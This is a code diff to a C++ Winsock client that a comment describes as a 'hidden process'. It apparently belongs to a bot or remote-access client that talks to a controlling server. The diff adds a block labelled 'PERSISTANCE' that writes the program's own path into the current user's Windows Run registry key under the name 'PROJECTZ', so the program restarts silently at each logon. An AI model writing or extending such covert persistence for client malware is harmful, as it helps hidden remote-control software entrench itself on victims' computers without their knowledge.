@@ -1,6 +1,8 @@
 //Winsock client compat with multi thread server
 //getting head
 #include <winsock2.h>
+#include <tchar.h>
+
 #include <windns.h>
 #include <iostream>
 #include <process.h>
@@ -11,6 +13,8 @@
 using namespace std;
 
 //-----Prototypes and global vars
+TCHAR exepath[MAX_PATH]; //Persistence reg variables
+HKEY hKey; //Persistence reg variables
 const char pingbuffer[1] = {'*'}; // Ping server command
 char sendbuffer[200];
 void ReverseIP(char* pIP);
@@ -27,7 +31,33 @@ int PORT;
 
 
 int main()
+
+
 {
+
+    /////////////////////////////PERSISTANCE////////////////
+
+ GetModuleFileName(0, exepath, MAX_PATH);
+    LONG lnRes = RegOpenKeyEx(
+           HKEY_CURRENT_USER,
+           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+           0,KEY_WRITE,
+           &hKey
+       );
+       if( ERROR_SUCCESS == lnRes )
+       {
+          lnRes = RegSetValueEx(hKey,
+                         "PROJECTZ",
+                         0,
+                         REG_SZ,
+                         (BYTE*) exepath,
+                         _tcslen(exepath));
+                             printf("In reg.. go check");
+                         }
+
+   /////////////////////////////PERSISTANCE////////////////
+
+
 //This will be a hidden process , so we will keep verbosity low mainly for debugging
     //________WSA Prep +Check
     addr.sin_family = AF_INET;
